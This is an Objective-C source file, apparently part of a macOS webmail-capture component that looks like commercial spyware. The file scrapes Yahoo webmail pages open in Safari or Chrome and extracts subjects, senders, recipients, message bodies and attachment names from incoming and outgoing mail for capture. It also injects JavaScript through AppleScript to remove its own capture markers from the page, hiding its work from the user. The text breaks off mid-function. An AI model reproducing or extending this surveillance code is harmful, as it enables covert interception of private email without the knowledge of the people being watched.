//
//  WebmailHTMLParser.m
//  WebmailCaptureManager
//
//  Created by ophat on 2/18/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "WebmailHTMLParser.h"
#import "WebmailChecker.h"
#import "WebmailNotifier.h"

#import "DateTimeFormat.h"
#import "FxEmailMacOSEvent.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "SystemUtilsImpl.h"

#define kIncoming  0
#define kOutgoing  1

@implementation WebmailHTMLParser

@synthesize mDelegate, mSelector, mThreadA, mWebmailChecker, mWebmailNotifier;
@synthesize isUsingIncomingOutlook;

static WebmailHTMLParser* _WebmailHTMLParser = nil;

+ (instancetype) sharedWebmailHTMLParser {
    if (_WebmailHTMLParser == nil) {
        _WebmailHTMLParser = [[WebmailHTMLParser alloc]init];
    }
    return (_WebmailHTMLParser);
}

+(void)Yahoo_HTMLParser:(NSString *)aMyhtml type:(NSString *)aType{
    DLog(@"IN Yahoo_HTMLParser");
    NSString * subject = @"";
    NSString * sender = @"";
    NSString * senderEmail = @"";
    NSString * senderImageUrl = @"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl = @"";
    NSString * sentDate = @"";
    NSString * messageBody =@"";
    
    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    
    if ([clearHTML rangeOfString:@"id=\"shellnavigation-inner\""].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"id=\"shellnavigation-inner\""];
        origin =[[origin objectAtIndex:1] componentsSeparatedByString:@"id=\"slot_mbrec\""];
        origin =[[origin objectAtIndex:0] componentsSeparatedByString:@"id=\"storm-listnav\""];
        origin =[[origin objectAtIndex:1] componentsSeparatedByString:@"id=\"Inbox\""];
        
        if ([[origin objectAtIndex:0] rangeOfString:@"selected"].location != NSNotFound) {
            if ([clearHTML rangeOfString:@"id=\"shellinner\""].location != NSNotFound) {
                NSArray * temp = [clearHTML componentsSeparatedByString:@"id=\"shellinner\""];
                temp =[[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"boss-mask\""];
                temp = [[temp objectAtIndex:0] componentsSeparatedByString:@"class=\"tab-content"];
                
                for (int i = 1; i < [temp count]; i++) {
                    if ([[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabcontacts\""].location == NSNotFound &&
                        [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabcalendar\""].location == NSNotFound &&
                        [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabnotepad\""].location == NSNotFound &&
                        [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabnewsfeed\""].location == NSNotFound) {
                        if ([[temp objectAtIndex:i] rangeOfString:@"style=\"visibility: visible;\""].location != NSNotFound) {
                            
                            NSString * myContent = [temp objectAtIndex:i];
                            
                            if ([myContent rangeOfString:@"class=\"thread-subject\""].location != NSNotFound) {
                                NSArray * localTemp = [myContent componentsSeparatedByString:@"class=\"thread-subject\""];
                                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"title=\""];
                                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                                subject = [localTemp objectAtIndex:0];
                            }
                            
                            if([subject length] == 0){
                                if ([myContent rangeOfString:@"class=\"subject\""].location != NSNotFound) {
                                    DLog(@"User doesn't enable conversation");
                                    NSArray * localTemp = [myContent componentsSeparatedByString:@"class=\"subject\""];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"title=\""];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                                    subject = [localTemp objectAtIndex:0];
                                }
                            }
                            
                            if ([myContent rangeOfString:@"class=\"from lozengfy"].location != NSNotFound) {
                                NSArray * localTemp_1 = [myContent componentsSeparatedByString:@"class=\"from lozengfy"];
                                localTemp_1 = [[localTemp_1 objectAtIndex:[localTemp_1 count]-1] componentsSeparatedByString:@"data-name=\""];
                                localTemp_1 = [[localTemp_1 objectAtIndex:1] componentsSeparatedByString:@"\""];
                                sender = [localTemp_1 objectAtIndex:0];
                                
                                NSArray * localTemp_2 = [myContent componentsSeparatedByString:@"class=\"from lozengfy"];
                                localTemp_2 = [[localTemp_2 objectAtIndex:[localTemp_2 count]-1] componentsSeparatedByString:@"data-address=\""];
                                localTemp_2 = [[localTemp_2 objectAtIndex:1] componentsSeparatedByString:@"\""];
                                senderEmail = [localTemp_2 objectAtIndex:0];
                            }
                            
                            if([senderEmail length] == 0){
                                if ([myContent rangeOfString:@"class=\"base-lozenge"].location != NSNotFound) {
                                    NSArray * localTemp = [myContent componentsSeparatedByString:@"class=\"base-lozenge"];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"lozenge"];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"data-name=\""];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                                    sender = [localTemp objectAtIndex:0];
                                    
                                    localTemp = [myContent componentsSeparatedByString:@"class=\"base-lozenge"];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"lozenge"];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"data-address=\""];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                                    senderEmail = [localTemp objectAtIndex:0];
                                }
                            }
                            
                            if ([myContent rangeOfString:@"class=\"thread-date\""].location != NSNotFound) {
                                NSArray * localTemp = [myContent componentsSeparatedByString:@"class=\"thread-date\""];
                                localTemp = [[localTemp objectAtIndex:[localTemp count]-1] componentsSeparatedByString:@"title=\""];
                                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                                sentDate = [localTemp objectAtIndex:0];
                            }
                            
                            if([sentDate length] == 0){
                                if ([myContent rangeOfString:@"class=\"msg-date"].location != NSNotFound) {
                                    NSArray * localTemp = [myContent componentsSeparatedByString:@"class=\"msg-date\""];
                                    localTemp = [[localTemp objectAtIndex:[localTemp count]-1] componentsSeparatedByString:@"title=\""];
                                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                                    sentDate = [localTemp objectAtIndex:0];
                                }
                            }
                            
                            if ([myContent rangeOfString:@"class=\"recipients\""].location != NSNotFound) {
                                NSArray * localTemp = [myContent componentsSeparatedByString:@"class=\"recipients\""];
                                if ([[localTemp objectAtIndex:([localTemp count]-1)] rangeOfString:@"class=\"lozengfy"].location != NSNotFound) {
                                    localTemp = [[localTemp objectAtIndex:([localTemp count]-1)] componentsSeparatedByString:@"class=\"lozengfy"];
                                    for (int j = 0; j < [localTemp count]; j++) {
                                        if ([[localTemp objectAtIndex:j] rangeOfString:@"data-name=\""].location != NSNotFound) {
                                            NSArray* localSubTemp1 = [[localTemp objectAtIndex:j] componentsSeparatedByString:@"data-name=\""];
                                            localSubTemp1 = [[localSubTemp1 objectAtIndex:1] componentsSeparatedByString:@"\""];
                                            if ([[localSubTemp1 objectAtIndex:0] rangeOfString:@"@"].location != NSNotFound) {
                                                [receiverEmail addObject:[localSubTemp1 objectAtIndex:0]];
                                            }else{
                                                [receiver addObject:[localSubTemp1 objectAtIndex:0]];
                                            }
                                        }
                                        if ([[localTemp objectAtIndex:j] rangeOfString:@"data-address=\""].location != NSNotFound) {
                                            NSArray* localSubTemp2 = [[localTemp objectAtIndex:j] componentsSeparatedByString:@"data-address=\""];
                                            localSubTemp2 = [[localSubTemp2 objectAtIndex:1] componentsSeparatedByString:@"\""];
                                            if (![receiverEmail containsObject:[localSubTemp2 objectAtIndex:0]]) {
                                                [receiverEmail addObject:[localSubTemp2 objectAtIndex:0]];
                                            }
                                        }
                                    }
                                }
                            }
                            
                            if([receiverEmail count] == 0){
                                if ([myContent rangeOfString:@"id=\"msg-header-to"].location != NSNotFound) {
                                    NSArray * localTemp1 = [myContent componentsSeparatedByString:@"id=\"msg-header-to\""];
                                    NSArray * localTemp2;
                                    NSString * masterTemp = [localTemp1 objectAtIndex:1];
                                    
                                    localTemp1 = [masterTemp componentsSeparatedByString:@"data-address=\""];
                                    localTemp2 = [masterTemp componentsSeparatedByString:@"data-name=\""];
                                    
                                    for (int j=1; j < [localTemp1 count]; j++) {
                                        NSArray * subTemp = [[localTemp1 objectAtIndex:j]componentsSeparatedByString:@"\""];
                                        [receiverEmail addObject:[subTemp objectAtIndex:0]];
                                        subTemp = [[localTemp2 objectAtIndex:j]componentsSeparatedByString:@"\""];
                                        [receiver addObject:[subTemp objectAtIndex:0]];
                                    }
                                }
                            }
                            
                            if ([myContent rangeOfString:@"class=\"thread-body\""].location != NSNotFound) {
                                NSArray * localTemp = [myContent componentsSeparatedByString:@"class=\"thread-body\""];
                                localTemp = [[localTemp objectAtIndex:([localTemp count]-1)] componentsSeparatedByString:@"class=\"add-to-conv\""];
                                localTemp = [[localTemp objectAtIndex:0] componentsSeparatedByString:@"class=\"body undoreset\""];
                                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"thread-footer\""];
                                messageBody = [NSString stringWithFormat:@"<div> %@ </div>",[localTemp objectAtIndex:0]];
                                
                                //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
                            }
                            
                            if([messageBody length] == 0){
                                if ([myContent rangeOfString:@"class=\"msg-body"].location != NSNotFound) {
                                    NSArray * localTemp1 = [myContent componentsSeparatedByString:@"class=\"msg-body"];
                                    localTemp1 = [[localTemp1 objectAtIndex:1] componentsSeparatedByString:@"class=\"base-card-footer\""];
                                    messageBody = [NSString stringWithFormat:@"<div> %@ </div>",[localTemp1 objectAtIndex:0]];
                                    //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
                                }
                            }
                            
                            if ([myContent rangeOfString:@"class=\"tictac-att-thumb-flow cf composeV3\""].location != NSNotFound) {
                                NSArray * origin = [myContent componentsSeparatedByString:@"class=\"tictac-att-thumb-flow cf composeV3\""];
                                origin = [[origin objectAtIndex:1] componentsSeparatedByString:@"class=\"tictac-att-files-cover\""];
                                origin = [[origin objectAtIndex:0] componentsSeparatedByString:@"class=\"tictac-att-viewer tictac-att-thumb"];
                                for (int i=1; i<[origin count]; i++) {
                                    if ([[origin objectAtIndex:i] rangeOfString:@"title=\""].location != NSNotFound) {
                                        NSArray * localTemp = [[origin objectAtIndex:i] componentsSeparatedByString:@"title=\""];
                                        localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                                        [attachment addObject:[localTemp objectAtIndex:0]];
                                    }
                                }
                            }
                            
                            [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"YAHOO" direction:kIncoming];
                            
                            break;
                        }
                    }
                }
            }
        }
    }else{
        
        if ([clearHTML rangeOfString:@"id=\"Inbox\" class=\"selected\""].location != NSNotFound) {
            
            if ([clearHTML rangeOfString:@"class=\"mailContent\""].location != NSNotFound || [clearHTML rangeOfString:@"class=\"composepage\""].location != NSNotFound ) {
                
                if ([clearHTML rangeOfString:@"class=\"subjectbar clearfix\""].location != NSNotFound) {
                    NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"subjectbar clearfix\">"];
                    temp =[[temp objectAtIndex:1] componentsSeparatedByString:@"<div class=\"msgdate\""];
                    subject = [temp objectAtIndex:0];
                    subject = [subject stringByReplacingOccurrencesOfString:@"<h1>" withString:@""];
                    subject = [subject stringByReplacingOccurrencesOfString:@"</h1>" withString:@""];
                    subject = [subject stringByReplacingOccurrencesOfString:@"<span>" withString:@""];
                    subject = [subject stringByReplacingOccurrencesOfString:@"</span>" withString:@""];
                }
                
                if ([clearHTML rangeOfString:@"class=\"msgdate\""].location != NSNotFound) {
                    NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"msgdate\">"];
                    temp =[[temp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                    sentDate = [temp objectAtIndex:0];
                    sentDate = [sentDate stringByReplacingOccurrencesOfString:@"<nobr>" withString:@""];
                    sentDate = [sentDate stringByReplacingOccurrencesOfString:@"</nobr>" withString:@""];
                }
                
                if ([clearHTML rangeOfString:@"class=\"vcard\""].location != NSNotFound) {
                    NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"vcard\">"];
                    temp =[[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"mailContent\""];
                    temp = [[temp objectAtIndex:0] componentsSeparatedByString:@"class=\"details\""];
                    temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"contentnav\""];
                    
                    if ([[temp objectAtIndex:0] rangeOfString:@":</dt>"].location != NSNotFound) {
                        NSArray * localtemp = [[temp objectAtIndex:0]  componentsSeparatedByString:@":</dt>"];
                        for (int i=1; i<[localtemp count]; i++) {
                            NSString * stringtemp = [localtemp objectAtIndex:i];
                            stringtemp = [stringtemp stringByReplacingOccurrencesOfString:@"<dd class=\"emailids\">" withString:@""];
                            stringtemp = [stringtemp stringByReplacingOccurrencesOfString:@"</dd>" withString:@""];
                            NSArray * spliter = [stringtemp componentsSeparatedByString:@"</span>"];
                            
                            if (i==1) {
                                for (int j=0; j < ([spliter count]-1); j++) {
                                    NSString * subtemp = [spliter objectAtIndex:j];
                                    subtemp = [subtemp stringByReplacingOccurrencesOfString:@"<span>" withString:@""];
                                    NSArray * c_n_em = [subtemp componentsSeparatedByString:@"\" <"];
                                    sender = [c_n_em objectAtIndex:0];
                                    sender = [sender stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                                    senderEmail = [c_n_em objectAtIndex:1];
                                    senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@">" withString:@""];
                                }
                            }else {
                                for (int j=0; j < ([spliter count]-1); j++) {
                                    NSString * subtemp = [spliter objectAtIndex:j];
                                    subtemp = [subtemp stringByReplacingOccurrencesOfString:@"<span>" withString:@""];
                                    
                                    if ([subtemp rangeOfString:@"\" <"].location != NSNotFound) {
                                        NSArray * c_n_em = [subtemp componentsSeparatedByString:@"\" <"];
                                        NSString* receiverTemp = [c_n_em objectAtIndex:0];
                                        receiverTemp = [receiverTemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                                        NSString* receiverEMTemp = [c_n_em objectAtIndex:1];
                                        receiverEMTemp = [receiverEMTemp stringByReplacingOccurrencesOfString:@">" withString:@""];
                                        [receiver addObject:receiverTemp];
                                        [receiverEmail addObject:receiverEMTemp];
                                    }else{
                                        [receiver addObject:@""];
                                        NSString* receiverEMTemp = subtemp;
                                        receiverEMTemp = [receiverEMTemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                                        [receiverEmail addObject:receiverEMTemp];
                                    }
                                }
                            }
                        }
                    }
                }
                
                if ([clearHTML rangeOfString:@"class=\"mailContent\""].location != NSNotFound) {
                    NSArray * localTemp = [clearHTML componentsSeparatedByString:@"class=\"mailContent\""];
                    localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"contentbuttonbar ft\""];
                    messageBody = [NSString stringWithFormat:@"<div> %@ </div>",[localTemp objectAtIndex:0]];
                    //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
                }
                
                if ([clearHTML rangeOfString:@"class=\"att-tray clearfix\""].location != NSNotFound) {
                    NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"att-tray clearfix\">"];
                    temp =[[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"mailContent\""];
                    NSString * stringtemp =[temp objectAtIndex:0];
                    NSMutableArray * filenametemp = [[NSMutableArray alloc]init];
                    NSMutableArray * filenamesize = [[NSMutableArray alloc]init];
                    
                    if ([stringtemp rangeOfString:@"class=\"att-name\""].location != NSNotFound) {
                        NSArray * localtemp = [stringtemp componentsSeparatedByString:@"class=\"att-name\""];
                        for (int i=1;  i < [localtemp count]; i++) {
                            NSArray * subtemp = [[localtemp objectAtIndex:i] componentsSeparatedByString:@"title=\""];
                            subtemp = [[subtemp objectAtIndex:1] componentsSeparatedByString:@"\""];
                            [filenametemp addObject:[subtemp objectAtIndex:0]];
                        }
                    }
                    
                    if ([stringtemp rangeOfString:@"class=\"att-size\""].location != NSNotFound) {
                        NSArray * localtemp = [stringtemp componentsSeparatedByString:@"class=\"att-size\">"];
                        for (int i=1;  i < [localtemp count]; i++) {
                            NSArray * subtemp = [[localtemp objectAtIndex:i] componentsSeparatedByString:@"</div>"];
                            [filenamesize addObject:[subtemp objectAtIndex:0]];
                        }
                    }
                    
                    for (int i=0;  i < [filenametemp count]; i++) {
                        NSString * assembly = [NSString stringWithFormat:@"%@ %@",[filenametemp objectAtIndex:i],[filenamesize objectAtIndex:i]];
                        [attachment addObject:assembly];
                    }
                    
                    [filenametemp release];
                    [filenamesize release];
                }
                
                
                [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"YAHOO" direction:kIncoming];
            }
        }
    }
    DLog(@"End IN Yahoo_HTMLParser");
    [receiver release];
    [receiverEmail release];
    [attachment release];
}
+(void)Yahoo_HTMLParser_Outgoing:(NSString *)aMyhtml type:(NSString *)aType{
    DLog(@"OUT Yahoo_HTMLParser");
    
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
    
    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    
    if ([clearHTML rangeOfString:@"id=\"shellinner\""].location != NSNotFound) {
        
        if ([clearHTML rangeOfString:@"class=\"yh_cap_s\""].location !=NSNotFound) {

            NSArray * spliter = [clearHTML componentsSeparatedByString:@"yh_cap_s"];
            spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[<=:END:=>]"];
            NSString * myContent = [spliter objectAtIndex:0];
            
            NSArray * mySubject = [myContent componentsSeparatedByString:@"[S:=>]"];
            mySubject =[[mySubject objectAtIndex:1]componentsSeparatedByString:@"[SS:=>]"];
            subject = [mySubject objectAtIndex:0];
            
            spliter = [myContent componentsSeparatedByString:@"[SS:=>]"];
            spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[R:=>]"];
            NSString * temp = [spliter objectAtIndex:0];
            spliter = [temp componentsSeparatedByString:@" "];
            for (int i=0; i < [spliter count]; i++) {
                if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
                    senderEmail = [spliter objectAtIndex:i];
                    senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@"(" withString:@""];
                    senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@")" withString:@""];
                    senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@"<" withString:@""];
                    senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@">" withString:@""];
                    senderEmail = [senderEmail stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                }else{
                    if (sender) {
                        sender = [NSString stringWithFormat:@"%@ %@",sender,[spliter objectAtIndex:i]];
                    }else{
                        sender = [spliter objectAtIndex:i];
                    }
                }
            }
            sender = [sender stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
            
            spliter = [myContent componentsSeparatedByString:@"[R:=>]"];
            spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[A:=>]"];
            temp = [spliter objectAtIndex:0];
            temp = [temp stringByReplacingOccurrencesOfString:@"," withString:@" "];
            spliter = [temp componentsSeparatedByString:@" "];
            NSString * tempName = @"";
            for (int i=0; i < [spliter count]; i++) {
                if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
                    NSString *localtemp = [spliter objectAtIndex:i];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@";" withString:@""];
                    localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                    
                    if (![receiverEmail containsObject:localtemp]) {
                        [receiverEmail addObject:localtemp];
                        tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
                        tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
                        tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
                        tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                        [receiver addObject:tempName];
                    }
                    tempName=@"";
                }else{
                    if (tempName) {
                        tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
                    }else{
                        tempName = [spliter objectAtIndex:i];
                    }
                }
            }
            
            spliter = [myContent componentsSeparatedByString:@"[A:=>]"];
            spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[M:=>]"];
            NSString * tempAttach = [spliter objectAtIndex:0];
            tempAttach = [tempAttach stringByReplacingOccurrencesOfString:@" " withString:@""];
            if ([tempAttach  length]>0) {
                spliter = [tempAttach componentsSeparatedByString:@","];
                for (int i =0 ; i < [spliter count]; i++) {
                    NSString * attachName = [[spliter objectAtIndex:i] stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                    [attachment addObject:attachName];
                }
            }
            
            spliter = [myContent componentsSeparatedByString:@"[M:=>]"];
            
            spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[<=:MEND:=>]"];
            messageBody = [spliter objectAtIndex:0];
            //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
            
            sentDate = [WebmailHTMLParser roundUpSecond];
            
            [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"YAHOO" direction:kOutgoing];
            
            if([aType isEqualToString:@"Safari"]){
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Safari\" \n do JavaScript \" function deleter(){ var remover = document.getElementsByClassName('yh_cap_s'); for(var j = 0; j < remover.length; j++) { remover[j].parentNode.removeChild(remover[j]); } } deleter(); \" \n return the result \n end tell"];
                [scpt executeAndReturnError:nil];
                [scpt release];
            }else if([aType isEqualToString:@"Google Chrome"]){
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \" function deleter(){ var remover = document.getElementsByClassName('yh_cap_s'); for(var j = 0; j < remover.length; j++) { remover[j].parentNode.removeChild(remover[j]); } } deleter(); \" \n return the result \n end tell"];
                [scpt executeAndReturnError:nil];
                [scpt release];
            }
        }
    }else{
        
        if ([clearHTML rangeOfString:@"id=\"Inbox\" class=\"selected\""].location != NSNotFound) {
            
            if ([clearHTML rangeOfString:@"class=\"composepage\""].location != NSNotFound) {
                
                if ([clearHTML rangeOfString:@"class=\"yh_cap_s\""].location !=NSNotFound) {
    
                    NSArray * spliter = [clearHTML componentsSeparatedByString:@"yh_cap_s"];
                    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[<=:END:=>]"];
                    NSString * myContent = [spliter objectAtIndex:0];
                    
                    NSArray * mySubject = [myContent componentsSeparatedByString:@"[S:=>]"];
                    mySubject =[[mySubject objectAtIndex:1]componentsSeparatedByString:@"[SS:=>]"];
                    subject = [mySubject objectAtIndex:0];
                    
                    spliter = [myContent componentsSeparatedByString:@"[SS:=>]"];
                    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[R:=>]"];
                    NSString * temp = [spliter objectAtIndex:0];
                    spliter = [temp componentsSeparatedByString:@" "];
                    for (int i=0; i < [spliter count]; i++) {
                        if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
                            senderEmail = [spliter objectAtIndex:i];
                            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@"(" withString:@""];
                            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@")" withString:@""];
                            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@"<" withString:@""];
                            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@">" withString:@""];
                            senderEmail = [senderEmail stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                        }else{
                            if (sender) {
                                sender = [NSString stringWithFormat:@"%@ %@",sender,[spliter objectAtIndex:i]];
                            }else{
                                sender = [spliter objectAtIndex:i];
                            }
                        }
                    }
                    sender = [sender stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                    
                    spliter = [myContent componentsSeparatedByString:@"[R:=>]"];
                    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[A:=>]"];
                    temp = [spliter objectAtIndex:0];
                    temp = [temp stringByReplacingOccurrencesOfString:@"," withString:@" "];
                    spliter = [temp componentsSeparatedByString:@" "];
                    
                    NSString * tempName = @"";
                    for (int i=0; i < [spliter count]; i++) {
                        if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
                            NSString *localtemp = [spliter objectAtIndex:i];
                            localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
                            localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
                            localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
                            localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
                            localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                            localtemp = [localtemp stringByReplacingOccurrencesOfString:@";" withString:@""];
                            localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                            
                            if (![receiverEmail containsObject:localtemp]) {
                                [receiverEmail addObject:localtemp];
                                tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
                                tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
                                tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
                                tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                                [receiver addObject:tempName];
                            }
                            tempName=@"";
                        }else{
                            if (tempName) {
                                tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
                            }else{
                                tempName = [spliter objectAtIndex:i];
                            }
                        }
                    }
                    
                    spliter = [myContent componentsSeparatedByString:@"[A:=>]"];
                    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[M:=>]"];
                    NSString * tempAttach = [spliter objectAtIndex:0];
                    tempAttach = [tempAttach stringByReplacingOccurrencesOfString:@" " withString:@""];
                    if ([tempAttach  length]>0) {
                        spliter = [tempAttach componentsSeparatedByString:@","];
                        for (int i =0 ; i < [spliter count]; i++) {
                            NSString * attachName = [[spliter objectAtIndex:i] stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                            [attachment addObject:attachName];
                        }
                    }
                    
                    spliter = [myContent componentsSeparatedByString:@"[M:=>]"];
                    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"[<=:MEND:=>]"];
                    messageBody = [NSString stringWithFormat:@"<textarea style='height:100%%;width:100%%' height='100%%' width='100%%' disabled> %@ </textarea>",[spliter objectAtIndex:0]];
                    //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
                    
                    
                    sentDate = [WebmailHTMLParser roundUpSecond];
                    [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"YAHOO" direction:kOutgoing];
                    
                    if([aType isEqualToString:@"Safari"]){
